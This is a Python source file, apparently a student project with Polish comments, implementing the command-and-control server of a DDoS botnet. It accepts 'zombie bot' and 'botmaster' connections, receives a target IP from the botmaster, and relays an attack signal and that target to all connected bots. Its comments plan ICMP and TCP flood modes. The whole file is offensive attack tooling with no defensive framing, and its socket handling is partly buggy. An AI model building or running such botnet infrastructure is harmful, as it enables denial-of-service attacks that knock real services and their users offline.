import socket
import time
from _thread import start_new_thread

startAttack: bool = False
ip = '127.0.0.1'


def thread_for_botmaster(c, st):
    global startAttack
    global ip
    print('Botmaster Connected')

    # todo:odebrac rodzaj ataku od botmastera
    # 1-icmp flood
    # 2-Tcp Flood
    # if rec == 1:
    #   attack_type = 'icmp_flood'
    # if rec == 2:
    #   attack_type = 'tcp_flood'

    ip = str(c.recv(16).decode())
    print('received target ip=' + ip)
    startAttack = True
    stop = str(c.recv(1).decode())
    print("stop:" + stop)
    if stop == 'x':
        startAttack = False
        print('Botmaster wants the attack to end')


def thread_for_zombieBot(c, addr):
    global startAttack
    global ip
    pom = 0
    while True:
        # data received from client
        if not startAttack:
            if pom == 1:  # pom == 1 indicates that the botmaster wants to stop an ongoing attack
                c.send('0'.encode())
                print('ending attack')
                pom = 0

            time.sleep(1)
            continue

        try:
            # todo:w zaleznosci od ataku wyslij odpowiedni identyfikator tj. 1,2,3 itd
            c.send('1'.encode())
            time.sleep(0.5)
            c.send(ip.encode())
            pom = 1
        except:
            print("Bot is disconnected")
            c.close()

        while startAttack:
            time.sleep(1)

    c.close()


if __name__ == '__main__':
    host = '127.0.0.1'
    host = '192.168.100.11'
    port = 65432
    max_connections = 5
    pom = 0
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.bind((host, port))
    socket.listen(max_connections)
    sqlDatabase=[]
    try:
        while True:
            client_socket, addr = socket.accept()

            data = client_socket.recv(1).decode()  # info about which client type is connected 1-bot 2-botmaster
            if int(data) == 1:
                print('normal bot connected')
                sqlDatabase.append(client_socket.getsockname())
                print(sqlDatabase)
                start_new_thread(thread_for_zombieBot, (client_socket, addr))
            if int(data) == 2:

                # todo: można zrobić jakiś proces logowania i walidacje
                #
                print('botmaster connected')
                start_new_thread(thread_for_botmaster, (client_socket, addr))
            if startAttack:
                pom = 1
                print("pom")

            if not startAttack and pom == 1:
                print("new server address")
                socket.detach()
                socket.close()

                socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.bind((host, port))
                socket.listen(max_connections)

                pom = 0
    except KeyboardInterrupt:
        socket.close()
